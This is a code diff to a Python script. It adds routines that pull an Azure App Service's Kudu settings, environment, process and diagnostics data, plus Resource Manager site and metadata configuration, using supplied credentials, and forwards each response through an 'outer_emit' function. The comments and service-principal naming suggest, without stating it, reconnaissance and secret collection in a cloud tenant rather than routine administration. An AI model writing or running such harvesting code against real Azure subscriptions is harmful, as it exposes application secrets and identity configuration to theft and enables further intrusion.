@@ -96,6 +96,37 @@ def arm_call(token, url, method="GET", payload=None, timeout=12):
     except Exception as e:
         return {"__error__": repr(e)}
 
+# Collect the App Service/Kudu configuration before launching the worker.  The
+# SCM container is often isolated from the actual app container; these
+# endpoints reveal the runtime/startup path and any app-side identity wiring
+# without guessing ports or shelling through Kudu blindly.
+def kudu_get(path, timeout=15):
+    try:
+        u = "https://" + APP + ".scm.azurewebsites.net" + path
+        req = urllib.request.Request(u, headers={"Authorization":"Basic "+auth})
+        raw = urllib.request.urlopen(req, timeout=timeout).read()
+        return {"status":"ok", "body":raw.decode("utf-8","replace")[:30000]}
+    except Exception as e:
+        return {"status":"error", "error":repr(e)}
+
+try:
+    for path in ("/api/settings", "/api/environment", "/api/processes", "/api/diagnostics"):
+        outer_emit({"stage":"kudu-" + path.strip("/").replace("/","-"), "response":kudu_get(path)})
+except Exception as e:
+    outer_emit({"stage":"kudu-config-error", "error":repr(e)})
+
+try:
+    site_base = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP
+    for suffix in (
+        "?api-version=2023-01-01",
+        "/config/web?api-version=2022-03-01",
+        "/config/metadata/list?api-version=2022-03-01",
+        "/config/slotConfigNames?api-version=2022-03-01",
+    ):
+        outer_emit({"stage":"sp-site-config", "path":suffix, "response":arm_call(arm, site_base + suffix)})
+except Exception as e:
+    outer_emit({"stage":"sp-site-config-error", "error":repr(e)})
+
 def shared_headers(account, key, verb, container, blob=None, query=None):
     now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
     version = "2019-12-12"
